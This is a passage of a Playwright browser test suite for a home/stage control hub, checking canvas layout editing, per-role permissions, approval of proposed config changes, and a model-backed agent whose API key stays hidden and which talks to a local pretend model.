        fits = await next(f for f in owner.frames if "/screens/canvas/" in f.url).evaluate("() => { const b = document.querySelector('#board').getBoundingClientRect(); return [Math.round(b.width), Math.round(b.bottom), innerHeight]; }")
        check("a taller canvas is drawn as large as fits on the screen, with nothing to scroll", fits[0] > 700 and fits[1] <= fits[2], str(fits))
        if shots: await owner.screenshot(path=f"{shots}/13b-canvas-wide-every-piece.png")

        # --- Full screen, for any screen, from the bar ---
        if await owner.evaluate("document.fullscreenEnabled || !!document.webkitFullscreenEnabled"):
            await owner.locator("#full").click()
            await owner.locator("#bar").wait_for(state="hidden", timeout=5000)
            await owner.wait_for_timeout(400)
            canvas_frame = next(f for f in owner.frames if "/screens/canvas/" in f.url)
            filled = await canvas_frame.evaluate("() => { const b = document.querySelector('#board').getBoundingClientRect(); return [Math.round(b.width), Math.round(b.bottom), innerWidth, innerHeight]; }")
            check("full screen hides the bar, offers the way out, and the canvas still fills the screen", await owner.locator("#bar").is_hidden() and await owner.locator("#unfull").is_visible() and filled[0] > filled[2] - 60 and filled[1] <= filled[3], str(filled))
            if shots: await owner.screenshot(path=f"{shots}/13c-canvas-full-screen.png")
            check("in full screen a canvas is controls only: no name, no Edit, no list of canvases", await cv.locator("#arrange").is_hidden() and await cv.locator("h1").is_hidden() and await cv.locator("#switcher").is_hidden())
            await owner.mouse.move(700, 4)
            await owner.locator("#unfull").click()
            await owner.locator("#bar").wait_for(timeout=5000)
            await cv.locator("#arrange").wait_for()
            check("Exit full screen brings the bar back, and the canvas's own buttons", await owner.locator("#bar").is_visible() and await owner.locator("#unfull").is_hidden())

        # --- A desktop layout of its own: a fine grid that is the whole screen ---
        await cv.locator("#layouts button", has_text="Desktop").click()
        await cv.locator("#blank", has_text="No desktop layout").wait_for()
        check("a canvas drawn only for a phone offers, on Desktop, to create a desktop layout", await cv.get_by_role("button", name="Create desktop layout").is_visible())
        await cv.get_by_role("button", name="Create desktop layout").click(); await cv.locator("#done").wait_for()
        cells = await cv.locator("#board .cell").count()
        check("arranging the new desktop layout shows the whole fine grid, 48 by 27", cells == 48 * 27, str(cells))
        await cv.locator("#addPiece").select_option("button"); await cv.locator("#pickFind").fill("outlet 1 on")
        await cv.locator("#pickList .pick").first.click(); await owner.wait_for_timeout(300)
        spans = await next(f for f in owner.frames if "/screens/canvas/" in f.url).evaluate("() => { const s = document.querySelector('#board .slot'); return [s.style.gridColumn, s.style.gridRow]; }")
        check("a button added to a desktop layout takes about a phone button's room: 4 by 2 fine cells", spans == ["1 / span 4", "1 / span 2"], str(spans))
        await cv.locator("#layouts button", has_text="Mobile").click(); await owner.wait_for_timeout(300)
        check("while arranging, Mobile switches to the canvas as drawn for a phone, untouched", await cv.locator("#board .cell").count() < 48 * 27 and await cv.locator("#board.fixed").count() == 0)
        await cv.locator("#layouts button", has_text="Desktop").click(); await owner.wait_for_timeout(300)
        await cv.locator("#done").click(); await cv.locator("#arrange").wait_for()
        await cv.locator("#board.fixed .piece").first.wait_for()
        drawn = await next(f for f in owner.frames if "/screens/canvas/" in f.url).evaluate("() => { const b = document.querySelector('#board').getBoundingClientRect(); return [Math.round(b.right), Math.round(b.bottom), innerWidth, innerHeight]; }")
        check("kept, the desktop layout is what a wide screen shows, drawn whole within the screen", await cv.locator("#layouts button[aria-pressed=true]").inner_text() == "Desktop" and drawn[0] <= drawn[2] and drawn[1] <= drawn[3], str(drawn))
        await cv.locator("#layouts button", has_text="Mobile").click()
        await cv.locator("#board .updown").first.wait_for()
        check("Mobile shows the phone layout on the same screen", await cv.locator("#board.fixed").count() == 0)
        await cv.locator("#layouts button", has_text="Desktop").click(); await cv.locator("#board.fixed").wait_for()
        await owner.set_viewport_size({"width": 390, "height": 844})
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#switchList [data-id]").nth(4).wait_for(state="attached", timeout=8000)
        await choose(cv, "switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        canvas_frame = next(f for f in owner.frames if "/screens/canvas/" in f.url)
        lamp_on = cv.locator("#board button.piece", has_text="Lamp on")
        check("a button is lit by a reading of its device", "lit" in await lamp_on.get_attribute("class") and "lit" not in await cv.locator("#board button.piece", has_text="Lamp off").get_attribute("class"), await lamp_on.get_attribute("class"))
        three = cv.locator("#board button.piece", has_text="Outlet 3")
        was = "lit" in await three.get_attribute("class")
        await three.click()
        await cv.locator("#board button.piece.lit", has_text="Outlet 3").wait_for(timeout=5000)
        check("a repeated row of buttons: the one pressed turns the outlet on and lights up", not was and (await state("sim-switch"))["switch/outlet/3/on"] is True)
        if shots: await owner.screenshot(path=f"{shots}/10b-canvas-switcher.png")

        # --- One button, several steps in turn ---
        with open(os.path.join(canvas_dir, "scene.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Scene", "pages": [{"name": "One", "pieces": [
                {"type": "button", "at": [1, 1, 4, 1], "title": "Walk-in", "steps": [
                    {"key": "switch/outlet/1/on", "value": True},
                    {"key": "switch/outlet/2/brightness", "value": 42},
                    {"wait": 1.5},
                    {"key": "switch/outlet/1/on", "value": False}]},
                {"type": "button", "at": [1, 2, 4, 1], "title": "Broken scene", "steps": [
                    {"key": "switch/outlet/4/on", "value": True},
                    {"key": "switch/outlet/9/on", "value": True}]}]}]}, f)
        await owner.goto(base + "/s/canvas"); cv = owner.frame_locator("#screen")
        await cv.locator("#switchList [data-id]", has_text="Scene").wait_for(state="attached", timeout=8000)
        await choose(cv, "scene")
        walk = cv.locator("#board button.piece", has_text="Walk-in")
        await walk.click()
        await cv.locator("#board button.piece.busy", has_text="Walk-in").wait_for(timeout=3000)
        # The first steps are done while it waits, before the last one.
        midway = {}
        for _ in range(30):
            midway = await state("sim-switch")
            if midway["switch/outlet/1/on"] is True or not await cv.locator("#board button.piece.busy").count(): break
            await owner.wait_for_timeout(50)
        await cv.locator("#board button.piece.busy").wait_for(state="detached", timeout=8000)
        after = await state("sim-switch")
        check("a button with steps does them in turn, waiting where it says, and shows it is busy meanwhile", midway["switch/outlet/1/on"] is True and round(after["switch/outlet/2/brightness"]) == 42 and after["switch/outlet/1/on"] is False, f"{midway.get('switch/outlet/1/on')} {after.get('switch/outlet/2/brightness')} {after.get('switch/outlet/1/on')}")
        await cv.locator("#board button.piece", has_text="Broken scene").click()
        await cv.locator("#said", has_text="Stopped at step 2 of 2").wait_for(timeout=8000)
        check("it stops at the first step that fails and says which", (await state("sim-switch"))["switch/outlet/4/on"] is True)
        await choose(cv, "switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        await choose(cv, "run-sheet"); await cv.locator("#board .clock .num").wait_for()
        check("one canvas holds pieces of several devices, and a clock", re.match(r"^\d{1,2}:\d\d:\d\d", await cv.locator("#board .clock .num").inner_text()) is not None and await cv.locator("#board .readout .num").inner_text() == "on" and await cv.locator("#board button.piece[aria-pressed]").count() == 2, await cv.locator("#board").inner_text())
        house = cv.locator("#board .slider", has_text="House lights")
        box = await house.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * .9, box["y"] + 4); await owner.mouse.down()
        await owner.mouse.move(box["x"] + box["width"] * .3, box["y"] + 4, steps=6); await owner.mouse.up()
        for _ in range(40):
            if abs((await state("sim-switch"))["switch/outlet/2/brightness"] - 30) <= 3: break
            await owner.wait_for_timeout(100)
        dim = (await state("sim-switch"))["switch/outlet/2/brightness"]
        check("a slider lying down sets the brightness it is dragged to", abs(dim - 30) <= 3 and await house.locator(".num").inner_text() == f"{round(dim)}%", f"{dim} {await house.locator('.num').inner_text()}")
        if shots: await owner.screenshot(path=f"{shots}/10c-canvas-run-sheet.png")
        # The owner adds the ear-mix canvas. Nobody has set the owner's own ears, and it says so.
        await cv.locator("#switchName").click(); await cv.locator("#newCanvas").click()
        await cv.locator("#shelf .item", has_text="My monitor mix").get_by_role("button", name="Add").click()
        await cv.locator("#board .slider").first.wait_for(timeout=8000)
        check("a piece that needs something nobody has set for you says so, and sends nothing", await cv.locator("#board .slider.off").count() == 8 and "Not assigned" in await cv.locator("#board .slider").first.inner_text(), await cv.locator("#board .slider").first.inner_text())

        # A canvas of nothing but words is for everyone, so the test's one is taken away again before Sam looks.
        os.remove(os.path.join(canvas_dir, "words.json"))
        # Sam is given the two abilities about Sam's own ears, on Canvas. The same canvas is now Sam's own mix.
        musician = next(r for r in everything["roles"] if r["name"] == "Musician")
        saved = await admin("/admin/api/role", {"role": {**musician, "grants": {**musician["grants"], "canvas": ["see-my-ears", "adjust-my-ears"]}}})
        check("a role can be given part of Canvas", saved.get("ok") is True, json.dumps(saved)[:200])
        # Sam was turned off earlier. The owner turns Sam back on, and Sam signs in again.
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": False})
        await pg.goto(base + "/signin"); await pg.fill("#name", "Sam"); await pg.fill("#secret", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader")
        await pg.goto(base + "/s/canvas")
        sv = pg.frame_locator("#screen")
        await sv.locator("#board .slider").first.wait_for(timeout=10000)
        check("Sam is shown the one canvas with anything of Sam's on it, and no way to add, arrange or remove one", await sv.locator("#name").inner_text() == "My monitor mix" and not await sv.locator("#switcher").is_visible() and not await sv.locator("#arrange").is_visible(), await sv.locator("header").inner_text())
        strips = await sv.locator("#board .slider .name").all_inner_texts()
        check("each strip takes its name from the board", len(strips) == 8 and strips[1] == (await state("sim-console"))["console/input/2/name"], str(strips))
        two = sv.locator("#board .slider").nth(1)
        box = await two.locator(".track").bounding_box()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .5); await pg.mouse.down()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .2, steps=8); await pg.mouse.up()
        # The board ends up where the thumb was let go, and the strip shows what the board holds.
        words = lambda v: ("+" if v > 0 else "") + f"{v:.1f}"
        for _ in range(40):
            level = (await state("sim-console"))["console/input/2/bus/1/level"]
            if level > -90 and await two.locator(".num").inner_text() == words(level): break
            await pg.wait_for_timeout(100)
        check("dragging a strip moves that input in Sam's own bus on the board", -20 < level < 5 and await two.locator(".num").inner_text() == words(level), f"{level} {await two.locator('.num').inner_text()}")
        if shots: await pg.screenshot(path=f"{shots}/10d-canvas-sam.png")
        sf = next(f for f in pg.frames if "/screens/canvas/" in f.url)
        ack = await sf.evaluate(ASK, ["sim-console", "console/input/2/bus/5/level", 0])
        check("whatever a canvas has on it, Sam's reach stops at Sam's own bus", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await sf.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("and Sam cannot flip a switch through Canvas", ack.get("ok") is False and (await state("sim-switch"))["switch/outlet/1/on"] is False, json.dumps(ack))
        kept = await sf.evaluate("""() => new Promise((res) => {
          addEventListener("message", (e) => { if (e.data.type === "doc-ack" && e.data.ref === "probe-doc") res(e.data); });
          parent.postMessage({ type: "doc-put", id: "my-ears", doc: { kind: "canvas", name: "Sam's", pages: [] }, ref: "probe-doc" }, "*");
          setTimeout(() => res({ timeout: true }), 1500);
        })""")
        check("or change a canvas", kept.get("ok") is False, json.dumps(kept))
        probes = await sf.evaluate(PROBES)
        check("Canvas is held to the same sandbox as every screen", all(v == "blocked" for k, v in probes.items() if k != "origin") and probes["origin"] == "null", json.dumps(probes))
        await pg.goto(base + "/s/one-fader")

        # --- Arranging a canvas on the screen: choose, drag, size, add, and nothing is kept until Done ---
        def on_disk(name):
            with open(os.path.join(canvas_dir, name + ".json")) as f: return json.load(f)
        async def cells(locator):
            return await locator.evaluate("(e) => [e.style.gridColumn, e.style.gridRow].join(' | ')")
        await choose(cv, "run-sheet"); await cv.locator("#board .clock .num").wait_for()
        before = on_disk("run-sheet")
        await cv.locator("#arrange").click(); await cv.locator("#board .cell").first.wait_for()
        check("arranging shows the grid, and a bar with what can be done", await cv.locator("#bar #done").is_visible() and await cv.locator("#bar #undo").is_disabled() and not await cv.locator("#pick").is_visible())
        outlet = (await state("sim-switch"))["switch/outlet/1/on"]
        one = cv.locator("#board .slot", has=cv.locator("button[aria-pressed]")).first
        await one.click(); await cv.locator("#panel h2", has_text="Toggle").wait_for()
        await owner.wait_for_timeout(300)
        check("while arranging, touching a piece chooses it and does not use it", (await state("sim-switch"))["switch/outlet/1/on"] is outlet and await cv.locator("#setKey").input_value() == "switch/outlet/1/on")
        back = cv.locator("#board .slot", has_text="Band back")
        await back.click(); await cv.locator("#panel h2", has_text="Button").wait_for(); await owner.wait_for_timeout(700)
        was = await cells(back)
        box = await back.bounding_box()
        await owner.mouse.move(box["x"] + 30, box["y"] + 30); await owner.mouse.down()
        await owner.mouse.move(box["x"] + 30, box["y"] + 30 + 68 * 2, steps=6); await owner.mouse.up()
        await owner.wait_for_timeout(300)
        check("dragging the chosen piece moves it by whole cells", [was, await cells(back)] == ["3 / span 2 | 6 / span 1", "3 / span 2 | 8 / span 1"], f"{was} -> {await cells(back)}")
        await cv.locator("#undo").click()
        check("Undo puts it back", await cells(back) == was and await cv.locator("#undo").is_disabled(), await cells(back))
        await back.click(); await owner.wait_for_timeout(700)
        grip = await cv.locator("#board .slot.sel .grip").bounding_box(); wide = (await back.bounding_box())["width"]
        await owner.mouse.move(grip["x"] + 10, grip["y"] + 10); await owner.mouse.down()
        await owner.mouse.move(grip["x"] + 10 - wide / 2, grip["y"] + 10 + 68, steps=6); await owner.mouse.up()
        await owner.wait_for_timeout(300)
        check("dragging its corner sizes it", await cells(back) == "3 / span 1 | 6 / span 2", await cells(back))
        await back.focus(); await owner.keyboard.press("ArrowLeft"); await owner.wait_for_timeout(200)
        check("and the arrow keys move it too", await cells(cv.locator("#board .slot", has_text="Band back")) == "2 / span 1 | 6 / span 2", await cells(cv.locator("#board .slot", has_text="Band back")))
        check("two pieces left on the same cell are marked, so it is seen before it is kept", await cv.locator("#board .slot.clash").count() == 2, str(await cv.locator("#board .slot.clash").count()))
        # A new piece is tied to something by choosing from what the devices have.
        await cv.locator("#addPiece").select_option("slider"); await cv.locator("#pickFind").wait_for()
        await cv.locator("#pickFind").fill("input 3 bus 2 level")
        found = await cv.locator("#pickList .pick").all_inner_texts()
        check("adding a piece asks what to tie it to, from what the screen's devices have", len(found) == 1 and "Send level, input 3, bus 2" in found[0] and "console/input/3/bus/2/level" in found[0], str(found[:3]))
        await cv.locator("#pickList .pick").first.click(); await cv.locator("#panel h2", has_text="Slider").wait_for()
        check("the new piece is on the canvas, chosen, in the first place it fits", await cv.locator("#setKey").input_value() == "console/input/3/bus/2/level" and await cv.locator("#board .slot.sel .slider").count() == 1)
        check("nothing has reached the hub yet", on_disk("run-sheet") == before)
        if shots: await owner.screenshot(path=f"{shots}/11-canvas-arranging.png")
        await cv.locator("#done").click(); await cv.locator("#arrange").wait_for()
        after = on_disk("run-sheet")["pages"][0]["pieces"]
        check("Done keeps the canvas, as the same kind of file anyone could have written", [p["at"] for p in after if p.get("title") == "Band back"] == [[2, 6, 1, 2]] and any(p.get("key") == "console/input/3/bus/2/level" and p["type"] == "slider" for p in after) and len(after) == len(before["pages"][0]["pieces"]) + 1, json.dumps(after)[-400:])
        await cv.locator("#board .slider", has_text="Send level").wait_for(timeout=8000)
        check("and the canvas is in use again, with the new piece on it", not await cv.locator("#bar").is_visible() and await cv.locator("#board .cell").count() == 0)
        # Cancel loses what was done, after asking once.
        await cv.locator("#arrange").click(); await cv.locator("#board .cell").first.wait_for()
        await cv.locator("#board .slot", has_text="Band back").click(); await cv.locator("#removePiece").click()
        await cv.locator("#cancel").click()
        check("Cancel asks before losing changes", await cv.locator("#cancel").inner_text() == "Discard changes?" and await cv.locator("#bar").is_visible())
        await cv.locator("#cancel").click(); await cv.locator("#arrange").wait_for()
        check("and then nothing is kept", on_disk("run-sheet")["pages"][0]["pieces"] == after and await cv.locator("#board button.piece", has_text="Band back").count() == 1)
        # A canvas from nothing: named, a group that repeats, and a second page.
        await cv.locator("#switchName").click(); await cv.locator("#newCanvas").click(); await cv.locator("#startEmpty").click(); await cv.locator("#setName").wait_for()
        await cv.locator("#setName").fill("Video desk"); await cv.locator("#setName").blur()
        await cv.locator("#addPiece").select_option("button"); await cv.locator("#pickFind").fill("outlet 1 on")
        await cv.locator("#pickList .pick").first.click(); await cv.locator("#groupPiece").click()
        await cv.locator("#panel .field", has_text="Repeats").locator("select").select_option("range")
        await cv.locator("#setTo").fill("4"); await cv.locator("#setTo").blur()
        await cv.locator("#board .slot[data-path^='1/1']").nth(1).click(); await cv.locator("#panel h2", has_text="Button").wait_for()
        await cv.locator("#panel .parts select").first.select_option("{n}")
        await cv.locator("#panel .field", has_text="Name").get_by_role("button", name="Use value").click()
        await cv.locator("#pickFind").fill("outlet name 1"); await cv.locator("#pickList .pick").first.click()
        await cv.locator("#panel .parts select").nth(1).select_option("{n}") if await cv.locator("#panel .parts select").count() > 1 else None
        await cv.locator("#addPage").click(); await cv.locator("#setPage").fill("Lamp"); await cv.locator("#setPage").blur()
        await cv.locator("#addPiece").select_option("clock")
        # A countdown is added by hand too, and says what it counts down to where it can be changed.
        await cv.locator("#addPiece").select_option("countdown")
        await cv.locator("#setUntil").fill("18:45"); await cv.locator("#setUntil").press("Tab")
        if shots: await owner.screenshot(path=f"{shots}/11b-canvas-new.png")
        await cv.locator("#done").click(); await cv.locator("#arrange").wait_for()
        made = on_disk("video-desk")
        added = made["pages"][1]["pieces"]
        check("a countdown added by hand counts down to the time typed for it", any(x["type"] == "countdown" and x["until"] == "18:45" for x in added), json.dumps(added))
        row = made["pages"][0]["pieces"][0]
        check("a new canvas is kept under a file name made from its name", made["name"] == "Video desk" and [p["name"] for p in made["pages"]] == ["Page 1", "Lamp"] and made["pages"][1]["pieces"][0]["type"] == "clock", json.dumps(made)[:300])
        check("a piece put in a group and repeated is written once, with the item's name in its key", row["type"] == "group" and row["repeat"] == {"as": "n", "from": 1, "to": 4} and row["pieces"][0]["key"] == "switch/outlet/{n}/on", json.dumps(row))
        await cv.locator("#board button.piece").nth(3).wait_for(timeout=8000)
        check("and it is drawn four times, opened as soon as it is kept", await cv.locator("#board button.piece").count() == 4 and await cv.locator("#switchList [aria-current]").get_attribute("data-id") == "video-desk", str(await cv.locator("#board button.piece").all_inner_texts()))

        # Deleting a canvas is in Edit, under Settings, and asks twice.
        await cv.locator("#arrange").click(); await cv.locator("#canvasSheet").click()
        await cv.locator("#deleteCanvas").click()
        check("Delete canvas asks to be confirmed", await cv.locator("#deleteCanvas").inner_text() == "Confirm delete" and await cv.locator("#switchList [data-id='video-desk']").count() == 1)
        await cv.locator("#deleteCanvas").click(); await cv.locator("#arrange").wait_for()
        await cv.locator("#switchList [data-id='video-desk']").wait_for(state="detached", timeout=8000)
        check("confirmed, the canvas is gone, and another one is shown", await cv.locator("#switchList [aria-current]").get_attribute("data-id") != "video-desk")

        # --- Someone who can only write files proposes a change. The hub does what is safe, and asks about the rest ---
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        folder = re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1)
        check("a hub starts out strict about what files may do", "Strict:" in await owner.locator("#configTrust").inner_text())
        path = os.path.join(folder, "devices", "sim-switch.json")
        with open(path) as f: device = json.load(f)
        check("the file says what the hub holds, and no more", device["control"] is True and device["name"] == "Simulated switch", str(device))
        device["control"] = False
        device["reach"]["allowed"] = device["reach"]["allowed"] + ["10.0.0.7:9000"]
        with open(path, "w") as f: json.dump(device, f)
        await owner.goto(base + "/admin")
        await owner.locator("#needs .need", has_text="2 config changes pending, 1 requiring approval.").wait_for(timeout=20000)
        check("Home says the files propose something, and how much of it needs a yes", True)
        await owner.locator("#needs .need", has_text="config changes").locator("a.open").click()
        await owner.wait_for_selector("#configList .change")
        told = await owner.locator("#configList").inner_text()
        check("the Hub place says each change in words, and which one waits", "Disable control of Simulated switch" in told and "Allow Simulated switch to connect to 10.0.0.7:9000 (local network)" in told and told.count("Requires approval") == 1 and told.count("Ready to apply") == 1, told)
        if shots: await owner.screenshot(path=f"{shots}/9-config-proposed.png", full_page=True)
        await owner.click("#configApply")
        asked = await owner.locator("#dlgBody").inner_text()
        check("applying shows what will be done, and it is only the change that hands out nothing", "Disable control of Simulated switch" in asked and "10.0.0.7" not in asked, asked)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelectorAll('#configList .change').length === 1")
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("what was safe is done, and what hands out power is not", switch["mode"] == "listen" and not any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configList .change").get_by_role("button", name="Approve").click()
        check("saying yes shows exactly what is being said yes to", "connect to 10.0.0.7:9000 (local network)" in await owner.locator("#dlgBody").inner_text())
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configList .status.ok", has_text="In sync. No pending changes.").wait_for(timeout=15000)
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("after the yes, the device holds it", any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configTrust").get_by_role("button", name="Change").click()
        await owner.locator("#dlgBody label.check", has_text="Trusted for 1 hour").locator("input").check()
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configTrust", has_text="Returns to strict in 60 minutes").wait_for(timeout=10000)
        check("trusting can be turned on for an hour, and the page says when it ends", "Trusted for 1 hour" in await owner.locator("#configTrust").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/9b-config-trusting.png", full_page=True)

        # --- The agent: someone on the team who is not a person ---
        secret_key = "sk-browser-test-key-123456"
        async def ok_dialog():
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#agentMake")
        check("the Hub place says what an agent is before there is one", "team member backed by a language model" in await owner.locator("#secAgent").inner_text())
        await owner.click("#agentMake"); await owner.fill("#agentName", "Robin"); await ok_dialog()
        await owner.wait_for_selector("#agentStatus")
        told = await owner.locator("#secAgent").inner_text()
        check("made, it is off with no roles and no key, says so, and cannot be turned on yet", "Disabled" in told and "No roles. It has no access" in told and "Not set. Get an API key" in told and await owner.locator("#agentTurn").is_disabled(), told)
        await owner.click("#agentKeySet"); await owner.fill("#agentKey", secret_key); await ok_dialog()
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('Hidden.')")
        everything = await (await owner_ctx.request.get(base + "/admin/api/all")).text()
        check("its key is kept and never shown again: not on the page, and not in what the page is told", secret_key not in await owner.content() and secret_key not in everything and '"keySet":true' in everything)
        await owner.click("#agentTurn"); await ok_dialog()
        await owner.locator("#agentStatus", has_text="Enabled").wait_for(timeout=8000)
        check("with a key it can be turned on, after a yes", True)
        if shots: await owner.screenshot(path=f"{shots}/12-agent.png", full_page=True)
        await place("People"); await owner.wait_for_selector("#people .item")
        robin = owner.locator("#people .item", has=owner.locator("h3", has_text="Robin"))
        check("under People it is one of the team, marked as the agent, with roles to give and no way to sign in", "Agent" in await robin.inner_text() and await robin.get_by_role("button", name="Roles").count() == 1 and await robin.get_by_role("button", name="Invite").count() == 0 and await robin.get_by_role("button", name="Reset sign-in").count() == 0, await robin.inner_text())

        # --- Asking it something. It thinks with a pretend model on this computer. ---
        model = f"http://127.0.0.1:{os.environ.get('MODEL_PORT', '7009')}"
        heard = lambda: json.loads(urllib.request.build_opener(urllib.request.ProxyHandler({})).open(model + "/heard").read())
        await place("Settings"); await owner.wait_for_selector("#agentStatus")
        told = await owner.locator("#secAgent").inner_text()
        check("on, it can be asked something, and the card says it can see no devices yet and how to change that", await owner.locator("#agentAsk").is_visible() and "No devices. Assign a role" in told, told)
        await owner.click("#agentModelSet"); await owner.fill("#agentAddress", model); await ok_dialog()
        await owner.wait_for_function("(m) => document.querySelector('#secAgent').innerText.includes(m.replace('http://', ''))", arg=model)
        await owner.fill("#agentQuestion", "Is anything not working?"); await owner.click("#agentAskGo")
        await owner.locator("#agentSaid.said").wait_for(timeout=15000)
        check("with no roles it looks, sees nothing, and says so", await owner.locator("#agentSaid").inner_text() == "I cannot see any devices yet." and "Listed devices: none accessible" in await owner.locator("#agentLooked").inner_text(), await owner.locator("#agentAnswer").inner_text())
        # Given a musician's role, it sees what a musician with no mix of their own sees: the names on the board.
        await place("People"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        await ok_dialog()
        await place("Settings"); await owner.locator("#secAgent", has_text="Access").wait_for()
        await owner.wait_for_function("() => /Access\\s+Simulated board\\./.test(document.querySelector('#secAgent').innerText)")
        check("given a role, the card names the devices it can now see", True)
        await owner.fill("#agentQuestion", "Is anything not working?"); await owner.press("#agentQuestion", "Enter")
        await owner.locator("#agentSaid.said", has_text="Simulated board").wait_for(timeout=15000)
        answer = await owner.locator("#agentAnswer").inner_text()
        check("asked again, it answers from what it can see, and the page says what it looked at and what that cost", "I can see Simulated board (48 values). Nothing looks wrong." in answer and "Listed devices: Simulated board" in answer and "2 model requests, 1,880 tokens" in answer, answer)
        await owner.fill("#agentQuestion", "And now?")
        await owner.wait_for_timeout(4600)
        check("the answer and a question being typed stay put while the page keeps itself current", "Nothing looks wrong." in await owner.locator("#agentSaid").inner_text() and await owner.input_value("#agentQuestion") == "And now?")
        h = heard()
        check("its model heard the key in the one place it belongs, and no person's name at all", h["asked"] == 4 and set(h["keys"]) == {secret_key} and secret_key not in h["text"] and "Sam" not in h["text"] and "Evan" not in h["text"], str(h["keys"]))
        if shots: await owner.screenshot(path=f"{shots}/13-agent-asked.png", full_page=True)

        # --- Which version this is ---
        await place("Settings"); await owner.wait_for_selector("#version .item")
        check("the Hub place says which version is running, and a hub run from its source says it is not updated by a button", "Running from source" in await owner.locator("#secVersion").inner_text() and await owner.locator("#versionGo").count() == 0)

        # --- Choosing its model from what its key can use ---
        await place("Settings"); await owner.wait_for_selector("#agentModelSet")
        await owner.click("#agentModelSet")
        await owner.locator("#agentModel option", has_text="Pretend Large 2 (pretend-large-2)").wait_for(state="attached", timeout=8000)
        options = await owner.locator("#agentModel option").all_inner_texts()
        check("the model is chosen from a list the hub asked the model's service for, with the one in use kept in it", options == ["claude-sonnet-5-5 (current)", "Pretend Large 2 (pretend-large-2)", "Pretend Small 2 (pretend-small-2)", "Other…"] and await owner.locator("#agentModelOther").is_hidden(), str(options))
        check("choosing a model asks for no PIN, and changing where the key is sent does", await owner.locator("#confirm").count() == 0)
        if shots: await owner.screenshot(path=f"{shots}/13b-agent-model.png")
        await owner.select_option("#agentModel", "pretend-small-2")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('pretend-small-2 · ')")
        check("the chosen model is the agent's model", True)
        await owner.click("#agentModelSet")
        await owner.locator("#agentModel option", has_text="Pretend Large 2").wait_for(state="attached", timeout=8000)
        await owner.select_option("#agentModel", label="Other…")
        await owner.fill("#agentModelOther", "claude-sonnet-5-5")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('claude-sonnet-5-5 · ')")
        check("a model that is not in the list can still be typed", True)
        # Which API the agent's provider speaks is chosen in the same place as its model and endpoint.
        await owner.click("#agentModelSet"); await owner.wait_for_selector("#agentSpeaks")
        check("an agent is asked through the Messages API until told otherwise", await owner.input_value("#agentSpeaks") == "messages")
        await owner.select_option("#agentSpeaks", "chat")
        check("choosing the other API says its models can be chosen once that is saved", "that provider's models" in await owner.locator("#agentModelNote").inner_text())
        await owner.locator("#dlgForm button[value='cancel']").click(); await owner.wait_for_selector("#dlg:not([open])", state="attached")

        # How far one question may go is on the card, and is changed there.
        check("the agent's card shows its max steps and max output tokens", "Max steps: 12 · Max output tokens: 8,192" in await owner.locator("#secAgent").inner_text())
        await owner.click("#agentLimitsSet"); await owner.fill("#agentSteps", "20"); await owner.fill("#agentTokens", "16000"); await ok_dialog()
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('Max steps: 20 · Max output tokens: 16,000')")
        check("both limits are changed from the card, and it says the new ones", True)
        if shots: await owner.locator("#secAgent").screenshot(path=os.path.join(shots, "13b-agent-limits.png"))

        # A second agent, for someone with a key of their own. The first stays the default.
        check("one agent answers everyone who may ask", "Everyone who may ask." in await owner.locator("#secAgent").inner_text())
        await owner.click("#agentAdd"); await owner.fill("#agentName", "Kit"); await ok_dialog()
        await owner.wait_for_selector("#agentWhich")
        options = await owner.locator("#agentWhich option").all_text_contents()
        check("the card chooses between the agents, and says which is the default", options == ["Robin (default)", "Kit"], str(options))
        told = await owner.locator("#agent").inner_text()
        check("a new agent is shown once made: the default's roles, no key, off, and nobody's until it is given", "Nobody yet" in told and "Not set" in told and "Disabled" in told and "No roles" not in told, told[:400])
        if shots: await owner.locator("#secAgent").screenshot(path=os.path.join(shots, "13c-agents.png"))
        await place("People")
        sam_row = owner.locator("#people .item", has_text="Sam")
        await sam_row.get_by_role("button", name="Agent", exact=True).click()
        await owner.select_option("#personAgent", label="Kit"); await ok_dialog()
        await owner.locator("#people .item", has_text="Agent: Kit").wait_for(timeout=8000)
        check("a person is given the other agent under People, and their row says so", "Sam" in await owner.locator("#people .item", has_text="Agent: Kit").inner_text())
